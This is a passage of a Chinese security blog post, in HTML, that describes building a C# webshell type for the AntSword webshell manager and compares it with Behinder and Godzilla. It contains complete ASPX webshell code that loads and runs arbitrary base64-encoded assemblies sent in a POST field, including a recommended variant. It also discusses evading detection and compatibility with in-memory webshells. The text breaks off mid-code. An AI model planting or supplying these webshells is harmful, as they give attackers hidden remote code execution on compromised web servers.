@@ -1,0 +1,647 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>聊聊新类型ASPXCSharp - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="聊聊新类型ASPXCSharp" />
+<meta property="og:description" content="1 前言最近花了点时间，给蚁剑加上了C#的shell类型。 其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/new-type-aspxcsharp/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-13T21:57:57+00:00" />
+<meta property="article:modified_time" content="2022-01-13T21:57:57+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="聊聊新类型ASPXCSharp"/>
+<meta name="twitter:description" content="1 前言最近花了点时间，给蚁剑加上了C#的shell类型。 其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/new-type-aspxcsharp/" /><link rel="prev" href="https://yzddmr6.com/posts/asp-net-memory-shell-router/" /><link rel="next" href="https://yzddmr6.com/posts/as-exploits-sharploader/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "聊聊新类型ASPXCSharp",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/new-type-aspxcsharp\/"
+        },"genre": "posts","wordcount":  2619 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/new-type-aspxcsharp\/","datePublished": "2022-01-13T21:57:57+00:00","dateModified": "2022-01-13T21:57:57+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#自定义类名">自定义类名</a></li>
+    <li><a href="#兼容内存马">兼容内存马</a></li>
+    <li><a href="#进一步思考">进一步思考</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">聊聊新类型ASPXCSharp</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-01-13">2022-01-13</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-01-13">2022-01-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2619 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#自定义类名">自定义类名</a></li>
+    <li><a href="#兼容内存马">兼容内存马</a></li>
+    <li><a href="#进一步思考">进一步思考</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>最近花了点时间，给蚁剑加上了C#的shell类型。</p>
+<p>其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有C#可以实现的功能：http://yzddmr6.com/posts/jscript-load-csharp-assembly/</p>
+<p>这次增加主要是有几点考虑：</p>
+<ol>
+<li>
+<p>Jscript的shell出现很容易被杀。我还没有见过用jscript写的项目，web目录下面出现了Jscript文件99.99%就是webshell，特征更明显一些。</p>
+</li>
+<li>
+<p>Jscript的语法属实恶心。没有啥文档，坑全部靠踩。</p>
+</li>
+<li>
+<p>C#类型可以兼容asp.net 各种内存马，Jscript无法做到。</p>
+</li>
+</ol>
+<p>本文记录一下自己在开发设计的过程中，遇到的一些问题以及自己的思考。</p>
+<h2 id="自定义类名" class="headerLink">
+    <a href="#%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb%e5%90%8d" class="header-mark"></a>2 自定义类名</h2><p>其实一开始遇到的问题是无法自定义类名的问题。c#跟java有一点不同的是，java的newInstance是不需要指定type的，只要有Class对象就可以实例化。但是c#在实例化的时候必须要指定实例化的type，这也意味着我们所有的全限定类名必须要一样。</p>
+<p>冰蝎默认类名都是U，就建在根命名空间下。每个payload是单独编译的。</p>
+<p>哥斯拉同样采用了这种机制，实例化的类名是LY。但是因为哥斯拉采用的方式是一次性把payload都打到内存里然后反射调用，所以可以把所有的基础payload都编译到一个dll里面。</p>
+<p>但是这样开发Payload的时候会很难受，因为在同一个项目下面都用一个固定的类名，编译器是会报冲突的。</p>
+<p>后来想到了一种取巧的办法，用python命令行调用编译程序，在编译之前把类名都统一替换掉。暂时解决了问题，但是还是感觉不够优雅。</p>
+<p>那么有没有什么办法可以动态获取到assembly的type呢？</p>
+<p>翻了翻手册，发现以下方法</p>
+<table>
+<thead>
+<tr>
+<th><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.object.gettype?view=netframework-3.0#System_Object_GetType" target="_blank" rel="noopener noreferrer">GetType()</a></th>
+<th>获取当前实例的 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.type?view=netframework-3.0" target="_blank" rel="noopener noreferrer">Type</a>。(继承自 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.object?view=netframework-3.0" target="_blank" rel="noopener noreferrer">Object</a>)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.gettypes?view=netframework-3.0#System_Reflection_Assembly_GetTypes" target="_blank" rel="noopener noreferrer">GetTypes()</a></td>
+<td>获取此程序集中定义的类型。</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.getname?view=netframework-3.0#System_Reflection_Assembly_GetName" target="_blank" rel="noopener noreferrer">GetName()</a></td>
+<td>获取此程序集的 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assemblyname?view=netframework-3.0" target="_blank" rel="noopener noreferrer">AssemblyName</a>。</td>
+</tr>
+</tbody>
+</table>
+<p>写代码测试一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">Payload</span> <span class="o">=</span> <span class="s">&#34;xxx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">a</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Assembly.GetName: &#34;</span><span class="o">+</span><span class="n">a</span><span class="p">.</span><span class="n">GetName</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Assembly.GetName.Name: &#34;</span><span class="o">+</span><span class="n">a</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Assembly.GetType: &#34;</span><span class="o">+</span><span class="n">a</span><span class="p">.</span><span class="n">GetType</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Assembly.GetTypes[0]: &#34;</span><span class="o">+</span><span class="n">a</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">()[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Assembly.GetTypes[0].FullName: &#34;</span><span class="o">+</span><span class="n">a</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="n">FullName</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>output</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">Assembly</span><span class="p">.</span><span class="nl">GetName</span><span class="p">:</span> <span class="n">BASE_Info</span><span class="p">,</span> <span class="n">Version</span><span class="o">=</span><span class="mf">0.0.0.0</span><span class="p">,</span> <span class="n">Culture</span><span class="o">=</span><span class="n">neutral</span><span class="p">,</span> <span class="n">PublicKeyToken</span><span class="o">=</span><span class="n">null</span>
+</span></span><span class="line"><span class="cl"><span class="n">Assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">.</span><span class="nl">Name</span><span class="p">:</span> <span class="n">BASE_Info</span>
+</span></span><span class="line"><span class="cl"><span class="n">Assembly</span><span class="p">.</span><span class="nl">GetType</span><span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span>
+</span></span><span class="line"><span class="cl"><span class="n">Assembly</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span> <span class="n">BASE_Info</span><span class="p">.</span><span class="n">Run</span>
+</span></span><span class="line"><span class="cl"><span class="n">Assembly</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nl">FullName</span><span class="p">:</span> <span class="n">BASE_Info</span><span class="p">.</span><span class="n">Run</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Assembly.GetTypes返回的是一个列表，而payload里面我们通常只会定义一个类，所以可以通过Assembly.GetTypes[0]来获取payload类的type。</p>
+<p>webshell中可以采用如下写法。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s">&#34;c#&#34;</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">Payload</span> <span class="o">=</span> <span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">Payload</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="n">FullName</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">Context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里又跟java的defineClass不太一样，defineClass只能打进去一个类，而c#的Assembly.Load可以加载一个程序集，并不一定只是一个类。所以为了考虑今后payload里可能会有多个类的情况，推荐的写法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s">&#34;c#&#34;</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">Payload</span> <span class="o">=</span> <span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">Payload</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span> <span class="o">+</span> <span class="s">&#34;.Run&#34;</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">Context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即强行指定实例化的类为命名空间下名为Run的类。</p>
+<h2 id="兼容内存马" class="headerLink">
+    <a href="#%e5%85%bc%e5%ae%b9%e5%86%85%e5%ad%98%e9%a9%ac" class="header-mark"></a>3 兼容内存马</h2><p>rebeyond大佬在最开始用加载assembly作为aspx类型的shell时，默认Equals里面是this对象。也就是Page对象。这种方式在aspx文件落地的情况下没有毛病，但是在内存马环境下，是没有Page对象的，这种办法也就不兼容。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>微软文档如下图</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>哥斯拉则对此进行了兼容处理，不再采用Page对象，而采用了兼容性更好的HttpContext</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>其实入口参数的本质就是获取到当前的request跟response对象。</p>
+<p>吸取了jsp的经验，一开始parseObj函数内置了三种方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">public</span> <span class="kt">void</span> <span class="nf">parseObj</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">IsArray</span><span class="p">)</span><span class="c1">//直接数组传入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Object</span><span class="p">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">[])</span><span class="n">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="n">Request</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpRequest</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="n">Response</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpResponse</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">Page</span> <span class="n">page</span> <span class="o">=</span> <span class="p">(</span><span class="n">Page</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span><span class="c1">//传入Page对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">this</span><span class="p">.</span><span class="n">Response</span> <span class="o">=</span> <span class="n">page</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="p">.</span><span class="n">Request</span> <span class="o">=</span> <span class="n">page</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
